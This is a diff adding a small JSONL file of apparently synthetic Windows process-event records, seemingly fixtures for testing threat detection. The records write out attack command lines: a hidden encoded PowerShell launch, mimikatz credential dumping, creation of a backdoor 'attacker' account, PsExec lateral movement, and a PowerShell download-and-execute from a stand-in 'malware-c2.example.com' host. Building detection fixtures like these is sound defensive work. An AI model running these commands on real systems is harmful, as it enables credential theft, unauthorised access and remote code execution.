@@ -1,0 +1,5 @@
+{"processName":"powershell.exe","processPath":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","fileHash":"44d88612fea8a8f36de82e1278abb02f","commandLine":"powershell.exe -nop -w hidden -enc SQBFAFgA","hostname":"WIN-PC01"}
+{"processName":"mimikatz.exe","processPath":"C:\\Temp\\mimikatz.exe","sha256":"d41d8cd98f00b204e9800998ecf8427e","commandLine":"mimikatz.exe sekurlsa::logonpasswords","hostname":"WIN-DC01"}
+{"processName":"cmd.exe","processPath":"C:\\Windows\\System32\\cmd.exe","fileHash":"aabbcc1122334455aabbcc1122334455","commandLine":"cmd.exe /c net user attacker P@ssw0rd! /add","hostname":"WIN-DC01"}
+{"processName":"psexec.exe","processPath":"C:\\Temp\\psexec.exe","sha256":"5f4dcc3b5aa765d61d8327deb882cf99","commandLine":"psexec.exe \\\\SRV-FILE01 cmd.exe","hostname":"WIN-DC01"}
+{"processName":"powershell.exe","processPath":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","fileHash":"44d88612fea8a8f36de82e1278abb02f","commandLine":"powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://malware-c2.example.com/payload')","hostname":"SRV-FILE01"}
